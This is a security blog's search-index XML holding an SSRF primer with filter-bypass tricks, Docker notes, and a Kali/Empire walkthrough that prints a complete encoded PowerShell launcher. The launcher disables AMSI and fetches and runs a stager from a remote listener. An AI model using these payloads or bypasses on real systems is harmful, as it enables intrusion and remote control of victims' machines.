<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[了解SSRF,这一篇就足够了]]></title>
      <url>%2F2018%2F03%2F06%2Fintroduction-to-ssrf%2F</url>
      <content type="text"><![CDATA[0x00 定义与成因SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 0x01 可能出现的地方1.社交分享功能：获取超链接的标题等内容进行显示 2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 3.在线翻译：给网址翻译对应网页的内容 4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试 7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 8.数据库内置功能：数据库的比如mongodb的copyDatabase函数 9.邮件系统：比如接收邮件服务器地址 10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 0x03 漏洞验证1.排除法：浏览器f12查看源代码看是否是在本地进行了请求 比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 2.dnslog等工具进行测试，看是否被访问 –可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 –从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址 –通过二级域名暴力猜解工具模糊猜测内网地址 4.直接返回的Banner、title、content等信息 5.留意bool型SSRF 0x04 利用方式1.让服务端去访问相应的网址 2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms 3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） 5.攻击内网应用程序（利用跨协议通信技术） 6.判断内网主机是否存活：方法是访问看是否有端口开放 7.DoS攻击（请求大文件，始终保持连接keep-alive always） 0x05 绕过小技巧注：参考[8]会有更详细的绕过方式总结 1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时想同的 2.各种IP地址的进制转换 3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/ 4.短网址绕过 http://t.cn/RwbLKDx 5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意） 指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务) 6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80 7.探测内网域名，或者将自己的域名解析到内网ip 8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host， 但这样可以用 http://abc@10.153.138.81/ 绕过 0x06 漏洞示例1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf 2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换） 3.weblogic的ssrf 0x07 漏洞修复1.禁止跳转 2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:///, gopher://, ftp:// 等引起的问题 4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 5.限制请求的端口为http常用的端口，比如 80、443、8080、8090 6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 0x08 漏洞利用中牵涉的小技巧crontab -l 显示当前计划任务 crontab -r 清除当前计划任务 端口转发工具 socat 在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php .jpg 0x09 相关材料[1]http://blog.safebuff.com/2016/07/03/SSRF-Tips/ [2]https://paper.seebug.org/393/ [3]https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF [4]http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html [5]https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 [6]http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/ [7]https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html [8]https://www.secpulse.com/archives/65832.html [9]https://www.cnblogs.com/s0ky1xd/p/5859049.html [10]https://www.t00ls.net/articles-41070.html [11]https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2 [12]https://ricterz.me/posts/HITCON%202017%20SSRFme [13]http://bobao.360.cn/learning/detail/240.html [14]https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0 [15]https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Docker笔记—基础篇]]></title>
      <url>%2F2017%2F12%2F02%2FDocker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87%2F</url>
      <content type="text"><![CDATA[概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。 Docker容器：一个轻量级沙箱，来运行和隔离应用 Docker仓库：用来存储Docker镜像文件的地方 Docker中用于区分的方式是id或者name:tag 安装官方文档：https://docs.docker.com/ 操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取） 123docker pull kalilinux/kali-linux-docker#如果想使用非官方仓库需要指定仓库完整的地址docker pull hub.c.163.com/public/ubuntu:14.04 建议：使用中科大镜像源 https://docker.mirrors.ustc.edu.cn 附带：在国内 docker build 的正确姿势 ####2.列出镜像 123➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GB REPOSITORY:来自哪个仓库 TAG:镜像的标签信息，能标示来自同一仓库的不同镜像 IMAGE ID:镜像的ID，此字段唯一标示了镜像 CREATED:创建时间 SIZE:镜像的大小 3.添加镜像标签1234567#对kalilinux/kali-linux-docker:latest添加新的标签kalilinux:latest➜ ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest#别名不一样但是两者的镜像文件是一样的（id相同）➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB 4.查看详细信息1234567891011121314151617➜ ~ docker inspect kalilinux:latest[ &#123; "Id": "sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536", "RepoTags": [ "kalilinux/kali-linux-docker:latest", "kalilinux:latest" ], "RepoDigests": [ "kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d" ], ...... "Metadata": &#123; "LastTagTime": "2017-12-02T04:56:53.8185955Z" &#125; &#125;] 5.查看镜像历史123456789➜ ~ docker history kalilinux:latestIMAGE CREATED CREATED BY SIZE COMMENT8ececeaf404d 9 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 9 months ago /bin/sh -c apt-get -y update &amp;&amp; apt-get -y... 251MB&lt;missing&gt; 9 months ago /bin/sh -c #(nop) ENV DEBIAN_FRONTEND=non... 0B&lt;missing&gt; 9 months ago /bin/sh -c echo "deb http://http.kali.org/... 134B&lt;missing&gt; 9 months ago /bin/sh -c #(nop) MAINTAINER steev@kali.org 0B&lt;missing&gt; 11 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 11 months ago /bin/sh -c apt-get -y update &amp;&amp; apt-get -y... 286MB 6.搜索镜像123456789101112#搜索所有自动创建的评价为1+的带kali关键字的镜像➜ ~ docker search --automated -s 3 kaliFlag --automated has been deprecated, use --filter=is-automated=true insteadFlag --stars has been deprecated, use --filter=stars=3 insteadNAME DESCRIPTION STARS OFFICIAL AUTOMATEDkalilinux/kali-linux-docker Kali Linux Rolling Distribution Base Image 361 [OK]linuxkonsult/kali-metasploit Kali base image with metasploit 54 [OK]jasonchaffee/kali-linux Kali Linux Docker Container with the kali-... 8 [OK]brimstone/kali 6 [OK]adamoss/kali2-metasploit Kali2 Automated Build 4 [OK]wsec/kali-metasploit Official Kali Base image + Metasploit 3 [OK]kalinon/comicstreamer ComicStreamer is a media server app for sh... 3 [OK] 7.删除镜像12345678910111213#如果同一个标签有多个tag，那么docker rmi只是删除tag而已#如果docker rmi id的话，会先删除所有的tag然后删除镜像#但是若该镜像的容器存在，也是无法删除的，如果想强制删除可以使用docker rmi -f id➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB➜ ~ docker rmi kalilinux/kali-linux-docker:latestUntagged: kalilinux/kali-linux-docker:latestUntagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux latest 8ececeaf404d 9 months ago 1.56GB 8.创建镜像1）基于已有镜像的容器创建 123456789101112#我们先创建容器并安装metasploit-framework➜ ~ docker run -it kalilinux:latest /bin/bashroot@de573c5f5dc6:/# apt update &amp;&amp; apt install metasploit-frameworkroot@de573c5f5dc6:/#exit#记住id为de573c5f5dc6#docker commit -m "改动信息" -a "作者名称" id REPOSITORY:TAG➜ ~ docker commit -m "install msf" -a "zeroyu" de573c5f5dc6 kalilinux:0.1sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux 0.1 66a6770d79d8 21 seconds ago 2.54GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB 2）基于本地模板导入 1docker import ... 9.存出和载入镜像1）存出镜像 1docker save -o docker_for_msf.tar kalilinux:0.1 2）载入镜像 123docker load --input docker_for_msf.tar#或则docker load &lt; docker_for_msf.tar 10.上传镜像1docker push kalilinux:0.1 操作容器1.创建容器1）新建容器 123456789#docker create新建的容器处于静止，可以使用docker start来启动它#-i 保持标准输入打开 -t分配一个伪终端➜ ~ docker create -it kalilinux:0.12bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf#查看处于终止状态的容器➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2bc48b88a424 kalilinux:0.1 "/bin/bash" 7 seconds ago Created frosty_poitrasde573c5f5dc6 kalilinux:latest "/bin/bash" 5 hours ago Exited (0) 5 hours ago happy_goldberg 2）启动容器 1234567#docker start id 启动相应的容器#docker ps 查看运行中的容器➜ ~ docker start 2bc48b88a4242bc48b88a424➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2bc48b88a424 kalilinux:0.1 "/bin/bash" 9 minutes ago Up 8 seconds frosty_poitras 3）新建并启动容器 12345678910111213141516171819202122#docker run = docker create + docker start#run的过程：1.检查镜像是否存在，不存在就下载；2.用镜像创建容器；挂载可读写层；3.分配虚拟接口#4.分配IP；5.运行指定程序；6.执行完自动终止➜ ~ docker run kalilinux:0.1 /bin/echo 'zeroyu'zeroyu➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd6a6045c4f8b kalilinux:0.1 "/bin/echo zeroyu" 3 minutes ago Exited (0) 3 minutes ago cocky_kirch➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES#常用命令如下➜ ~ docker run -it kalilinux:0.1 /bin/bashroot@2ed8aa5354f1:/# ps PID TTY TIME CMD 1 pts/0 00:00:00 bash 7 pts/0 00:00:00 psroot@2ed8aa5354f1:/# exitexit#推出后自动处于终止状态➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2ed8aa5354f1 kalilinux:0.1 "/bin/bash" About a minute ago Exited (0) 48 seconds ago goofy_bardeen 4）守护态运行 1234567891011#在后台运行容器➜ ~ docker run -d kalilinux:0.1 /bin/sh -c "while true ; do echo zeroyu ; sleep 1 ; done"88f12c0725a466ba6d8f08f34fc8e9ac263ecafdff0a9e7282d7e9bb4073e6a0➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES88f12c0725a4 kalilinux:0.1 "/bin/sh -c 'while..." 7 seconds ago Up 7 seconds sleepy_kowalevski➜ ~ docker logs 88f12c0725a4zeroyuzeroyuzeroyu...... 2.终止容器123456789101112131415#id为88f12c0725a4但是可以使用前几位来简单表示➜ ~ docker stop 8888#查看所有处于终止态的id➜ ~ docker ps -qa073ff4e1dac7#处于终止状态可以使用start来重新启动➜ ~ docker start 073073➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES073ff4e1dac7 kalilinux:0.1 "/bin/sh -c 'while..." About a minute ago Up About a minute cranky_benz#restart可以先终止再重新启动➜ ~ docker restart 073073 3.进入容器处于守护态（-d参数）的容器会在后台运行，但是你无法到信息，也无法进行操作。此时，要进入容器进行工作，要使用attach或者exec命令。 1） 使用attach命令 12345678#容器还可以使用name来唯一辨识➜ ~ docker run -itd kalilinux:0.177e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 20 seconds ago Up 21 seconds stupefied_gates➜ ~ docker attach stupefied_gatesroot@77e93d18a6a5:/# 2）使用exec命令 1234567➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 5 minutes ago Exited (0) About a minute ago stupefied_gates➜ ~ docker start 77e77e➜ ~ docker exec -it 77e93d18a6a5 /bin/bashroot@77e93d18a6a5:/# ####4.删除容器 123456789➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 7 minutes ago Up About a minute stupefied_gates➜ ~ docker rm 77e93d18a6a5Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove➜ ~ docker stop 77e93d18a6a577e93d18a6a5➜ ~ docker rm 77e93d18a6a577e93d18a6a5 5.导入和导出容器12345678#导出容器#无论这个容器是否正在运行都是可以导出的➜ ~ docker export -o test.tar 77e93d18a6a5#或者执行➜ ~ docker export 77e93d18a6a5 &gt; test.tar #导入容器➜ ~ docker import test.tar - test/kalilinux:v1.0 Docker数据管理1234567891011121314#使用-v标记挂在本地的tmp目录到容器中的/opt/tmp_test#使用rw（默认也是这种方式）来指定可读写#下面的#表示的不是注释➜ ~ docker run -it -P --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var# cd opt# lstmp_test# cd tmp_test# lscom.apple.launchd.0fGM76e6ao com.apple.launchd.UWfVYRXkwo powerlogcom.apple.launchd.AkQGotnulN pip-FfQw68-unpack zeroyu.txt# Docker端口映射123456789101112#-P是指映射到任意端口#-p加端口号，则将端口映射到所有地址的相应端口➜ ~ docker run -it -d -p 5000:5000 kalilinux:v0.223e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES23e91a40cb12 kalilinux:v0.2 "/bin/bash" 12 seconds ago Up 11 seconds 0.0.0.0:5000-&gt;5000/tcp boring_volhard➜ ~ docker attach boring_volhardroot@23e91a40cb12:/# cd home/Empire/root@23e91a40cb12:/home/Empire# lsLICENSE README.md changelog data empire lib setuproot@23e91a40cb12:/home/Empire# ###附例 在vps中的docker上使用empire进行渗透测试(metasploit同理) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158#端口映射参考上条================================================================ [Empire] Post-Exploitation Framework================================================================ [Version] 2.3 | [Web] https://github.com/empireProject/Empire================================================================ _______ .___ ___. .______ __ .______ _______ | ____|| \/ | | _ \ | | | _ \ | ____| | |__ | \ / | | |_) | | | | |_) | | |__ | __| | |\/| | | ___/ | | | / | __| | |____ | | | | | | | | | |\ \----.| |____ |_______||__| |__| | _| |__| | _| `._____||_______| 282 modules currently loaded 0 listeners currently active 0 agents currently active(Empire) &gt; helpCommands========agents Jump to the Agents menu.creds Add/display credentials to/from the database.exit Exit Empirehelp Displays the help menu.interact Interact with a particular agent.list Lists active agents or listeners.listeners Interact with active listeners.load Loads Empire modules from a non-standard folder.preobfuscate Preobfuscate PowerShell module_source filesreload Reload one (or all) Empire modules.reset Reset a global option (e.g. IP whitelists).resource Read and execute a list of Empire commands from a file.searchmodule Search Empire module names/descriptions.set Set a global option (e.g. IP whitelists).show Show a global option (e.g. IP whitelists).usemodule Use an Empire module.usestager Use an Empire stager.(Empire) &gt; list(Empire) &gt; listeners[!] No listeners currently active(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt; info Name: HTTP[S]Category: client_serverAuthors: @harmj0yDescription: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- SlackToken False Your SlackBot API token to communicate with your Slack instance. ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other). KillDate False Date for the listener to exit (MM/dd/yyyy). Name True http Name for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. DefaultDelay True 5 Agent delay/reach back interval (in seconds). DefaultLostLimit True 60 Number of missed checkins before exiting WorkingHours False Hours for the agent to operate (09:00-17:00). SlackChannel False #general The Slack channel or DM that notifications will be sent to. DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent. process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host True http://172.17.0.2:80 Hostname/IP for staging. CertPath False Certificate path for https listeners. DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0). Proxy False default Proxy to use for request (default, none, or other). UserAgent False default User-agent string to use for the staging request (default, none, or other). StagingKey True 3ab47284cf7e260541d810beb54d3405 Staging key for initial agent negotiation. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True 80 Port for the listener. ServerVersion True Microsoft-IIS/7.5 Server header for the control server. StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php(Empire: listeners/http) &gt; set Name docker#此处的172.16.188.1为vps的ip地址(Empire: listeners/http) &gt; set Host http://172.16.188.1:5000(Empire: listeners/http) &gt; execute[*] Starting listener 'docker'[+] Listener successfully started!(Empire: listeners/http) &gt; lsit*** Unknown syntax: lsit(Empire: listeners/http) &gt; back(Empire: listeners) &gt; list[*] Active listeners: Name Module Host Delay/Jitter KillDate ---- ------ ---- ------------ -------- docker http http://172.16.188.1:5000 5/0.0(Empire: listeners) &gt; usestagermulti/bash osx/dylib osx/teensy windows/launcher_sctmulti/launcher osx/jar windows/bunny windows/launcher_vbsmulti/pyinstaller osx/launcher windows/dll windows/macromulti/war osx/macho windows/ducky windows/macroless_mswordosx/applescript osx/macro windows/hta windows/teensyosx/application osx/pkg windows/launcher_batosx/ducky osx/safari_launcher windows/launcher_lnk(Empire: listeners) &gt; usestager windows/ddll ducky(Empire: listeners) &gt; usestager windows/dll(Empire: stager/windows/dll) &gt; infoName: DLL LauncherDescription: Generate a PowerPick Reflective DLL to inject with stager code.Options: Name Required Value Description ---- -------- ------- ----------- Listener True Listener to use. ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other). Obfuscate False False Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only. Proxy False default Proxy to use for request (default, none, or other). Language True powershell Language of the stager to generate. OutFile True /tmp/launcher.dll File to output dll to. UserAgent False default User-agent string to use for the staging request (default, none, or other). Arch True x64 Architecture of the .dll to generate (x64 or x86). ObfuscateCommand False Token\All\1 The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only. StagerRetries False 0 Times for the stager to retry connecting.(Empire: stager/windows/dll) &gt; set Listener docker(Empire: stager/windows/dll) &gt; back(Empire: listeners) &gt; launcher powershell dockerpowershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAFIAcwBpAE8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkAbgBHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQAbgB1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIAbgBwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==#在目标机器上执行上面的payload就可以得到下面的反弹(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[EIS 2017 DNS101题解]]></title>
      <url>%2F2017%2F11%2F02%2FEIS-2017-MISC%E9%A2%98%E8%A7%A3%2F</url>
